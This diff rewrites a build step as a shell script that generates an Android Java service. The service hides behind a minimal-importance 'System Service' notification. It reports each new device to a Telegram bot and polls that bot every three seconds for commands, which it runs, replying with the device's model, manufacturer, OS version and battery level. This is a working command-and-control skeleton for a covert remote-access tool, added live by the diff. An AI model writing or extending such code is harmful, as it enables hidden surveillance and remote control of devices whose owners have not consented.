@@ -1,82 +1,84 @@
-      - name: إنشاء CoreService.java (مع نظام التحكم)
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/CoreService.java
-          package com.h.core;
-          import android.app.*;
-          import android.content.*;
-          import android.os.*;
-          import org.json.JSONArray;
-          import org.json.JSONObject;
-          import okhttp3.*;
-          
-          public class CoreService extends Service {
-              private Handler handler;
-              private long lastUpdateId = 0; // لحفظ آخر أمر وصل
-              
-              @Override 
-              public void onCreate() {
-                  super.onCreate();
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                      NotificationChannel ch = new NotificationChannel("core", "System", NotificationManager.IMPORTANCE_MIN);
-                      ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
-                      startForeground(1001, new Notification.Builder(this, "core").setContentTitle("System Service").setSmallIcon(android.R.drawable.stat_sys_download).build());
-                  }
-                  
-                  Telegram.sendMessage(this, "✅ جهاز جديد متصل ومستعد لتلقي الأوامر\n" + Build.MANUFACTURER + " " + Build.MODEL);
-                  
-                  handler = new Handler(Looper.getMainLooper());
-                  // تشغيل مستمع الأوامر
-                  pollTelegramCommands();
-              }
-              
-              // دالة سحب الأوامر من البوت
-              private void pollTelegramCommands() {
-                  new Thread(() -> {
-                      try {
-                          OkHttpClient client = new OkHttpClient();
-                          Request req = new Request.Builder()
-                              .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1))
-                              .build();
-                          Response res = client.newCall(req).execute();
-                          if (res.isSuccessful() && res.body() != null) {
-                              String jsonData = res.body().string();
-                              JSONObject obj = new JSONObject(jsonData);
-                              JSONArray result = obj.getJSONArray("result");
-                              
-                              for (int i = 0; i < result.length(); i++) {
-                                  JSONObject update = result.getJSONObject(i);
-                                  lastUpdateId = update.getLong("update_id");
-                                  if (update.has("message")) {
-                                      JSONObject message = update.getJSONObject("message");
-                                      if (message.has("text")) {
-                                          String text = message.getString("text");
-                                          handleCommand(text); // إرسال الأمر للتنفيذ
-                                      }
-                                  }
-                              }
-                          }
-                      } catch (Exception e) {}
-                      
-                      // إعادة الفحص كل 3 ثواني
-                      handler.postDelayed(this::pollTelegramCommands, 3000);
-                  }).start();
-              }
-              
-              // دالة تنفيذ الأوامر
-              private void handleCommand(String cmd) {
-                  if (cmd.equals("/ping")) {
-                      Telegram.sendMessage(this, "✅ الجهاز متصل بالإنترنت وشغال 100%");
-                  } else if (cmd.equals("/battery")) {
-                      BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
-                      int battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-                      Telegram.sendMessage(this, "🔋 نسبة البطارية الحالية: " + battery + "%");
-                  } else if (cmd.equals("/info")) {
-                      Telegram.sendMessage(this, "📱 الموديل: " + Build.MODEL + "\n🏢 الشركة: " + Build.MANUFACTURER + "\n🤖 نظام أندرويد: " + Build.VERSION.RELEASE);
-                  } else {
-                      Telegram.sendMessage(this, "⚠️ أمر غير معروف. الأوامر المتاحة:\n/ping\n/battery\n/info");
-                  }
-              }
+# إنشاء المجلد إذا لم يكن موجوداً
+mkdir -p app/src/main/java/com/h/core
 
-              @Override public IBinder onBind(Intent i) { return null; }
-          }
-          EOF
+# إنشاء الملف بالمحتوى المطلوب تماماً
+cat << 'EOF' > app/src/main/java/com/h/core/CoreService.java
+package com.h.core;
+import android.app.*;
+import android.content.*;
+import android.os.*;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import okhttp3.*;
+
+public class CoreService extends Service {
+    private Handler handler;
+    private long lastUpdateId = 0; // لحفظ آخر أمر وصل
+    
+    @Override 
+    public void onCreate() {
+        super.onCreate();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel("core", "System", NotificationManager.IMPORTANCE_MIN);
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
+            startForeground(1001, new Notification.Builder(this, "core").setContentTitle("System Service").setSmallIcon(android.R.drawable.stat_sys_download).build());
+        }
+        
+        Telegram.sendMessage(this, "✅ جهاز جديد متصل ومستعد لتلقي الأوامر\n" + Build.MANUFACTURER + " " + Build.MODEL);
+        
+        handler = new Handler(Looper.getMainLooper());
+        // تشغيل مستمع الأوامر
+        pollTelegramCommands();
+    }
+    
+    // دالة سحب الأوامر من البوت
+    private void pollTelegramCommands() {
+        new Thread(() -> {
+            try {
+                OkHttpClient client = new OkHttpClient();
+                Request req = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1))
+                    .build();
+                Response res = client.newCall(req).execute();
+                if (res.isSuccessful() && res.body() != null) {
+                    String jsonData = res.body().string();
+                    JSONObject obj = new JSONObject(jsonData);
+                    JSONArray result = obj.getJSONArray("result");
+                    
+                    for (int i = 0; i < result.length(); i++) {
+                        JSONObject update = result.getJSONObject(i);
+                        lastUpdateId = update.getLong("update_id");
+                        if (update.has("message")) {
+                            JSONObject message = update.getJSONObject("message");
+                            if (message.has("text")) {
+                                String text = message.getString("text");
+                                handleCommand(text); // إرسال الأمر للتنفيذ
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {}
+            
+            // إعادة الفحص كل 3 ثواني
+            handler.postDelayed(this::pollTelegramCommands, 3000);
+        }).start();
+    }
+    
+    // دالة تنفيذ الأوامر
+    private void handleCommand(String cmd) {
+        if (cmd.equals("/ping")) {
+            Telegram.sendMessage(this, "✅ الجهاز متصل بالإنترنت وشغال 100%");
+        } else if (cmd.equals("/battery")) {
+            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+            int battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+            Telegram.sendMessage(this, "🔋 نسبة البطارية الحالية: " + battery + "%");
+        } else if (cmd.equals("/info")) {
+            Telegram.sendMessage(this, "📱 الموديل: " + Build.MODEL + "\n🏢 الشركة: " + Build.MANUFACTURER + "\n🤖 نظام أندرويد: " + Build.VERSION.RELEASE);
+        } else {
+            Telegram.sendMessage(this, "⚠️ أمر غير معروف. الأوامر المتاحة:\n/ping\n/battery\n/info");
+        }
+    }
+
+    @Override public IBinder onBind(Intent i) { return null; }
+}
+EOF
